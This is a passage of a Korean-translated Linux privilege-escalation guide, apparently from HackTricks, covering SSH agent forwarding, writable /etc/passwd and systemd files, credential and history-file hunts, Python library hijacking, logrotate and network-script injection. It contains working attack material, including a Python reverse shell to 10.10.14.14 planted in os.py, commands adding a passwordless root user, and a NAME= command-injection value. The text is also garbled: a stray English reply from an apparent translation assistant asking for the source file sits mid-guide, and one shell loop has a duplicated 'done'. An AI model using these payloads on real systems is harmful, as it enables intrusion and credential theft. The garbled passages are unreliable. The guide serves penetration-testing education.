사용자 인증에 사용할 public keys를 포함하는 파일을 지정합니다. `%h` 같은 토큰을 포함할 수 있으며, 이는 홈 디렉터리로 대체됩니다. **절대 경로**(루트 `/`로 시작)를 지정할 수 있고 또는 **사용자 홈에서의 상대 경로**를 지정할 수 있습니다. 예:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
해당 구성은 사용자가 "**testusername**"의 **private** 키로 로그인하려고 하면 ssh가 당신 키의 public key를 `/home/testusername/.ssh/authorized_keys` 및 `/home/testusername/access`에 있는 것들과 비교한다는 것을 나타냅니다.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding은 서버에 (패스프레이즈 없이!) 키를 남겨두지 않고도 로컬 SSH 키를 사용할 수 있게 해줍니다. 따라서 ssh로 한 호스트에 접속한 뒤, 초기 호스트에 있는 key를 사용해 거기서 다른 호스트로 jump할 수 있습니다.

이 옵션은 `$HOME/.ssh.config`에 다음과 같이 설정해야 합니다:
```
Host example.com
ForwardAgent yes
```
Notice that if `Host` is `*` every time the user jumps to a different machine, that host will be able to access the keys (which is a security issue).

파일 `/etc/ssh_config`는 이 **옵션들을 재정의**할 수 있으며 해당 구성을 허용하거나 거부할 수 있습니다.\
파일 `/etc/sshd_config`는 키워드 `AllowAgentForwarding`로 ssh-agent forwarding을 **허용**하거나 **거부**할 수 있습니다 (기본값은 allow).

환경에서 Forward Agent가 구성되어 있음을 발견하면 다음 페이지를 읽으십시오 — **이를 악용하여 권한을 상승시킬 수 있습니다**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 흥미로운 파일

### 프로필 파일

파일 `/etc/profile`와 `/etc/profile.d/` 아래의 파일들은 사용자가 새로운 셸을 실행할 때 **실행되는 스크립트들**입니다. 따라서, 이들 중 하나라도 **작성하거나 수정할 수 있다면 권한을 상승시킬 수 있습니다**.
```bash
ls -l /etc/profile /etc/profile.d/
```
이상한 프로파일 스크립트가 발견되면 **민감한 정보**가 있는지 확인해야 합니다.

### Passwd/Shadow 파일

OS에 따라 `/etc/passwd`와 `/etc/shadow` 파일의 이름이 다르거나 백업본이 있을 수 있습니다. 따라서 이 파일들을 **모두 찾아**서 파일을 **읽을 수 있는지 확인**하고 파일 내부에 **해시가 있는지** 확인하는 것이 권장됩니다:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
어떤 경우에는 `/etc/passwd` (또는 동등한 파일) 안에서 **password hashes**를 찾을 수 있습니다.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

먼저 다음 명령어들 중 하나로 비밀번호를 생성합니다.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don't have the contents of src/linux-hardening/privilege-escalation/README.md. Please paste the file content you want translated.

Also clarify what you mean by "Then add the user `hacker` and add the generated password.":
- Do you want me to append a translated instruction (and include a generated secure password value) into the README.md translation? — I can generate a strong password and include it in the translated markdown.
- Or do you want me to actually create the user on a system? — I cannot perform actions on your machine; I can only provide the exact commands you can run.

Tell me which option you want, and paste the README.md content to translate.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

이제 `su` 명령을 사용해 `hacker:hacker`로 전환할 수 있습니다

또는 비밀번호 없는 더미 사용자를 추가하려면 다음 줄을 사용할 수 있습니다.\
경고: 이로 인해 머신의 현재 보안이 저하될 수 있습니다.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
참고: BSD 플랫폼에서는 `/etc/passwd`가 `/etc/pwd.db` 및 `/etc/master.passwd`에 위치하며, 또한 `/etc/shadow`는 `/etc/spwd.db`로 이름이 변경되었습니다.

일부 민감한 파일에 **쓸 수 있는지** 확인해야 합니다. 예를 들어, 일부 **서비스 구성 파일**에 쓸 수 있나요?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
예를 들어, 머신에서 **tomcat** 서버가 실행 중이고 **/etc/systemd/ 안의 Tomcat 서비스 설정 파일을 수정할 수 있다면**, 다음 줄들을 수정할 수 있습니다:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
다음에 tomcat이 시작될 때 당신의 backdoor가 실행됩니다.

### 폴더 확인

다음 폴더들은 백업이나 흥미로운 정보를 포함하고 있을 수 있습니다: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (마지막 디렉터리는 아마 읽을 수 없겠지만 시도해 보세요)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 이상한 위치/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 최근 몇 분 내에 수정된 파일
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB 파일
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 파일
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 숨겨진 파일
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH의 Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **웹 파일**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **백업**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### 비밀번호가 들어있을 수 있는 알려진 파일들

Read the code of [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), it searches for **비밀번호를 포함하고 있을 수 있는 여러 파일들**.\
**또 다른 흥미로운 도구**로는 다음을 사용할 수 있다: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — 로컬 컴퓨터에 저장된 많은 비밀번호를 복구하는 데 사용되는 오픈 소스 애플리케이션으로 Windows, Linux & Mac용이다.

### 로그

로그를 읽을 수 있다면, 그 안에서 **흥미로운/기밀 정보**를 찾을 수 있을지도 모른다. 로그가 더 이상할수록(아마도) 더 흥미로울 것이다.\
또한, 일부 "**bad**"로 구성된(백도어된?) **audit logs**는 이 포스트에서 설명한 것처럼 감사 로그 내부에 **비밀번호를 기록**하게 할 수도 있다: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**로그를 읽으려면** [**adm**](interesting-groups-linux-pe/index.html#adm-group) 그룹이 정말 도움이 됩니다.

### Shell 파일
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

파일 이름에 **password**라는 단어가 포함되어 있는지, 또는 파일의 **name**이나 **content** 안에 포함되어 있는지 확인하고, 로그 내의 IPs와 emails 또는 해시 정규식도 확인하세요.\
여기서 이 모든 것을 수행하는 방법을 모두 나열하지는 않겠습니다만, 관심이 있다면 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)가 수행하는 마지막 검사들을 확인할 수 있습니다.

## 쓰기 가능한 파일

### Python library hijacking

만약 **어디에서** python 스크립트가 실행될지 알고, 해당 폴더에 **쓰기 권한이 있거나** 또는 **python 라이브러리를 수정할 수** 있다면, OS 라이브러리를 수정해 백도어를 심을 수 있습니다 (python 스크립트가 실행되는 위치에 쓸 수 있다면, os.py 라이브러리를 복사해서 붙여넣으세요).

**backdoor the library**하려면 os.py 라이브러리의 끝에 다음 줄을 추가하세요 (IP와 PORT를 변경하세요):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate 취약점 악용

A vulnerability in `logrotate` lets users with **write permissions** on a log file or its parent directories potentially gain escalated privileges. This is because `logrotate`, often running as **root**, can be manipulated to execute arbitrary files, especially in directories like _**/etc/bash_completion.d/**_. It's important to check permissions not just in _/var/log_ but also in any directory where log rotation is applied.

> [!TIP]
> 이 취약점은 `logrotate` 버전 `3.18.0` 및 그 이전에 영향을 미칩니다

More detailed information about the vulnerability can be found on this page: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

You can exploit this vulnerability with [**logrotten**](https://github.com/whotwagner/logrotten).

This vulnerability is very similar to [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** so whenever you find that you can alter logs, check who is managing those logs and check if you can escalate privileges substituting the logs by symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

If, for whatever reason, a user is able to **write** an `ifcf-<whatever>` script to _/etc/sysconfig/network-scripts_ **or** it can **adjust** an existing one, then your **system is pwned**.

Network scripts, _ifcg-eth0_ for example are used for network connections. They look exactly like .INI files. However, they are \~sourced\~ on Linux by Network Manager (dispatcher.d).

In my case, the `NAME=` attributed in these network scripts is not handled correctly. If you have **white/blank space in the name the system tries to execute the part after the white/blank space**. This means that **everything after the first blank space is executed as root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network과 /bin/id_ 사이의 공백에 주의하세요_)

### **init, init.d, systemd, and rc.d**

디렉터리 `/etc/init.d` 는 System V init (SysVinit)을 위한 **스크립트**들의 저장소입니다. 이는 `start`, `stop`, `restart`, 때로는 `reload` 같은 서비스를 제어하는 스크립트를 포함합니다. 이 스크립트들은 직접 실행되거나 `/etc/rc?.d/`에 있는 심볼릭 링크를 통해 호출될 수 있습니다. Redhat 계열에서는 대체 경로로 `/etc/rc.d/init.d`가 사용됩니다.

반면에 `/etc/init` 은 **Upstart**와 연관되어 있으며, Ubuntu에서 도입된 더 새로운 **service management**로서 서비스 관리를 위한 설정 파일을 사용합니다. Upstart로의 전환에도 불구하고, 호환성 레이어 때문에 SysVinit 스크립트는 Upstart 설정과 함께 여전히 사용됩니다.

**systemd** 는 현대적인 초기화 및 서비스 관리자이며, on-demand daemon 시작, automount 관리, 시스템 상태 스냅샷 같은 고급 기능을 제공합니다. 파일은 배포 패키지용으로 `/usr/lib/systemd/`에, 관리자가 수정하는 용도로 `/etc/systemd/system/`에 정리되어 있어 시스템 관리 과정을 단순화합니다.

## 기타 기법

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks는 일반적으로 syscall을 훅하여 privileged kernel 기능을 userspace manager에게 노출합니다. 약한 manager 인증(예: FD-order 기반 서명 검사나 취약한 비밀번호 체계)은 로컬 앱이 manager를 가장하여 이미 루팅된 디바이스에서 root로 권한 상승할 수 있게 합니다. 자세한 내용과 익스플로잇 방법은 다음을 참조하세요:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations의 regex 기반 service discovery는 프로세스 커맨드 라인에서 바이너리 경로를 추출하고 이를 -v 옵션과 함께 privileged 컨텍스트에서 실행할 수 있습니다. 관대한 패턴(예: \S 사용)은 쓰기 가능한 위치(예: /tmp/httpd)에 배치된 공격자 리스너와 매칭될 수 있으며, 이는 root로의 실행으로 이어질 수 있습니다 (CWE-426 Untrusted Search Path).

자세한 내용과 다른 discovery/monitoring 스택에도 적용 가능한 일반화된 패턴은 다음을 참조하세요:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## 커널 보안 보호

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## 추가 도움

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux local privilege escalation 벡터를 찾기 위한 최고의 도구:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## 참고자료

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
